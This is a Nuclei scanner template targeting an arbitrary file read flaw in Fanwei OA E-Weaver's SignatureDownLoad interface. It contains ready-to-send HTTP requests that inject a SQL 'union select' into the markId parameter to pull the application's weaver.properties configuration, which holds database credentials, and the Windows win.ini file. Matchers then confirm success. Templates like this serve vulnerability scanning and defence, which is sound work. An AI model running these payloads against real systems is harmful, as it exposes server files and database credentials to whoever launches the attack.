id: fanweiOA-E-Weaver-SignatureDownLoad-file-read

info:
  name: 泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞
  author: cnaq 
  severity: medium
  description: 泛微OA E-Weaver SignatureDownLoad接口存在任意文件读取漏洞,攻击者通过漏洞可以获取数据库中的敏感信息或者读取服务器任意文件
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Weaver%20SignatureDownLoad%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
  tags: fanwei,oa,ebridge,lfi


requests:
  - raw:
      - |
        GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27 HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        condition: or
        words:
          - 'MAPI=1'
          - 'ecology.url'
